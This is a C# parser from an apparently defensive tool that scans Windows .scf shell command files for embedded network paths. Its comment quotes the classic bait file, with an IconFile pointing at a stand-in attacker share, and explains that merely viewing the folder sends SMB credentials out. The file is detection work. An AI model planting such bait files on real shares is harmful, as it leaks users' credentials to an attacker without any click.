using ShareGuard.Core.Classification;
using ShareGuard.Core.Models;

namespace ShareGuard.Core.Parsers;

/// <summary>
/// .scf(Shell Command File)解析。
/// 经典诱饵写法:
///   [Shell]
///   Command=2
///   IconFile=\\attacker.example\share\icon.ico
/// 资源管理器在渲染目录视图时读取 IconFile,立即触发 SMB 认证外发——用户无需点击。
/// </summary>
public sealed class ScfParser : IBaitParser
{
    private static readonly string[] InterestingKeys =
    ["IconFile", "IconIndex", "Command", "TaskbarCommand", "Name"];

    public BaitFileType FileType => BaitFileType.Scf;
    public IReadOnlySet<string> Extensions { get; } = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { ".scf" };

    public IReadOnlyList<EmbeddedReference> Parse(string filePath, byte[] content)
    {
        var ini = IniFile.Parse(content);
        var refs = new List<EmbeddedReference>();

        foreach (var (section, key, value) in ini.EnumerateEntries())
        {
            // IconFile 是核心攻击面;其他键也检查,防止变种把 UNC 藏在 Command 里。
            var field = $"[{section}].{key}";
            foreach (var (candidate, _) in ReferenceParser.ExtractNetworkStrings(value))
                refs.Add(ReferenceParser.Parse(candidate, field));
        }
        return refs;
    }
}
